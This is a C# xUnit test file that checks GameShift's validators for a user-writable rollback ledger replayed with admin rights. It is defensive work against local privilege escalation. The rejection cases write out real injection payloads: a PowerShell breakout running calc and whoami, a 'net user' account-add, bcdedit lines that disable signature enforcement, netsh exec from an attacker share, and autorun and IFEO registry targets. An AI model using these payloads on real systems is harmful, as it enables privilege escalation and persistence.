using GameShift.Core.Monitoring;
using Xunit;

namespace GameShift.Tests.Monitoring;

/// <summary>
/// Security tests for the DPC rollback-ledger input validators in <see cref="DpcFixEngine"/>.
///
/// The ledger (AppSettings.AppliedDpcFixes) lives in user-writable %AppData%\GameShift\settings.json,
/// and its fields are replayed by the ELEVATED revert paths into PowerShell, bcdedit, netsh, powercfg,
/// and registry writes. A tampered entry is therefore a local privilege escalation. These validators
/// are the gate; the execution paths are admin-gated and cannot be unit-tested, so the validators are
/// tested directly. Each "rejects" case includes a real injection payload from the disclosure PoC, and
/// each "accepts" case is a value GameShift itself produces (see Resources/known-drivers.json).
/// </summary>
public class DpcLedgerSafetyTests
{
    // ── Net adapter keyword (primary RCE sink: -RegistryKeyword '{Target}') ──────

    [Theory]
    [InlineData("*InterruptModeration")]
    [InlineData("*EEE")]
    [InlineData("MSISupported")]
    [InlineData("JumboPacket")]
    public void NetAdapterKeyword_AcceptsRealKeywords(string keyword)
        => Assert.True(DpcFixEngine.IsValidNetAdapterKeyword(keyword));

    [Theory]
    [InlineData(@"x'; Start-Process calc.exe; whoami > $env:PUBLIC\pwned.txt; ('")] // disclosure PoC
    [InlineData("a' ; calc")]
    [InlineData("Foo Bar")]      // space
    [InlineData("Foo'")]         // quote breakout
    [InlineData("Foo;Bar")]      // statement separator
    [InlineData("$(calc)")]
    [InlineData("**Foo")]        // only a single leading * is legitimate
    [InlineData("")]
    [InlineData(null)]
    public void NetAdapterKeyword_RejectsInjectionAndJunk(string? keyword)
        => Assert.False(DpcFixEngine.IsValidNetAdapterKeyword(keyword));

    [Fact]
    public void NetAdapterKeyword_RejectsOverlyLong()
        => Assert.False(DpcFixEngine.IsValidNetAdapterKeyword(new string('a', 65)));

    // ── Integer value (-RegistryValue / powercfg value) ─────────────────────────

    [Theory]
    [InlineData("0")]
    [InlineData("1")]
    [InlineData("-5")]
    [InlineData("100")]
    public void IntegerValue_AcceptsIntegers(string value)
        => Assert.True(DpcFixEngine.IsIntegerValue(value));

    [Theory]
    [InlineData("1; calc")]
    [InlineData("0x1")]
    [InlineData("1 2")]
    [InlineData("abc")]
    [InlineData("")]
    [InlineData(null)]
    public void IntegerValue_RejectsNonIntegers(string? value)
        => Assert.False(DpcFixEngine.IsIntegerValue(value));

    // ── bcdedit revert args (validated after "bcdedit " is stripped) ─────────────

    [Theory]
    [InlineData("/deletevalue disabledynamictick")]
    [InlineData("/set disabledynamictick yes")]
    [InlineData("/set useplatformtick no")]
    [InlineData("/deletevalue useplatformtick")]
    public void BcdRevertArgs_AcceptsRealReverts(string args)
        => Assert.True(DpcFixEngine.IsSafeBcdRevertArgs(args));

    [Theory]
    // Dangerous-but-shape-valid elements: alphanumeric, /set or /deletevalue, but NOT in the
    // disabledynamictick/useplatformtick allowlist - these must be refused.
    [InlineData("/set nointegritychecks on")]        // disables driver-signature enforcement -> ring-0
    [InlineData("/set testsigning on")]
    [InlineData("/set safeboot minimal")]            // can hijack/brick next boot
    [InlineData("/set hypervisorlaunchtype off")]
    [InlineData("/set integrityservices disable")]
    [InlineData("/set bootstatuspolicy ignoreallfailures")]
    [InlineData("/set x & net user pwn P@ss /add")] // arg breakout attempt
    [InlineData("/deletevalue x; calc")]
    [InlineData("/set a b c")]                        // non-allowlisted element
    [InlineData("/raw")]                              // unknown verb
    [InlineData("del foo")]
    [InlineData("/set foo $(calc)")]
    [InlineData("")]
    [InlineData(null)]
    public void BcdRevertArgs_RejectsInjectionAndJunk(string? args)
        => Assert.False(DpcFixEngine.IsSafeBcdRevertArgs(args));

    // ── netsh revert args (validated after "netsh " is stripped) ─────────────────

    [Theory]
    [InlineData("int ip set global taskoffload=enabled")]
    [InlineData("int tcp set global autotuninglevel=normal")]
    public void NetshRevertArgs_AcceptsRealReverts(string args)
        => Assert.True(DpcFixEngine.IsSafeNetshRevertArgs(args));

    [Theory]
    // Shape-valid but outside the "int ip|tcp set global" context GameShift uses - must be refused.
    [InlineData("advfirewall set allprofiles state off")] // disables the firewall
    [InlineData("firewall set opmode disable")]
    [InlineData("int portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.5 connectport=3389")] // port forward
    [InlineData("add helper evil.dll")]
    [InlineData("wlan set hostednetwork mode=allow")]
    [InlineData("int ip delete global taskoffload")]     // wrong verb (delete, not set)
    [InlineData(@"exec \\attacker\share\evil.txt")]  // disclosure PoC: netsh exec runs a remote script
    [InlineData(@"-f \\attacker\share\evil.txt")]
    [InlineData("int ip set global x=1 & calc")]      // ampersand token
    [InlineData("int ip set \"global\"")]             // quote
    [InlineData(@"int ip set c:\path")]               // path separator
    [InlineData("")]
    [InlineData(null)]
    public void NetshRevertArgs_RejectsInjectionAndJunk(string? args)
        => Assert.False(DpcFixEngine.IsSafeNetshRevertArgs(args));

    // ── Registry revert target (arbitrary HKLM write sink) ──────────────────────

    [Theory]
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\HwSchMode")]
    [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows\Dwm\OverlayTestMode")]
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Enum\PCI\VEN_10DE&DEV_2204&SUBSYS_00000000&REV_A1\3&11583659&0&00\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties\MSISupported")]
    public void RegistryRevertTarget_AcceptsKnownFixTargets(string target)
        => Assert.True(DpcFixEngine.IsAllowedRegistryRevertTarget(target));

    [Theory]
    [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Evil")]                                  // autorun
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Services\Foo\ImagePath")]                                     // service hijack
    [InlineData(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger")] // IFEO
    [InlineData(@"HKCU\SOFTWARE\Foo\Bar")]                                                                    // not HKLM
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\..\..\..\SOFTWARE\X\Y")]              // traversal
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers")]                                    // no value-name segment
    // Under the Enum\ root but NOT the exact MSISupported value - the old broad allowlist let these
    // through; they must now be refused.
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Enum\Root\LEGACY_BEEP\0000\Service")]                         // device service binding
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Enum\Root\Foo\0000\ConfigFlags")]
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Enum\PCI\X\Y\Service")]
    [InlineData(@"HKLM\SYSTEM\CurrentControlSet\Enum\Foo\Bar")]
    [InlineData("")]
    [InlineData(null)]
    public void RegistryRevertTarget_RejectsDangerousTargets(string? target)
        => Assert.False(DpcFixEngine.IsAllowedRegistryRevertTarget(target));
}
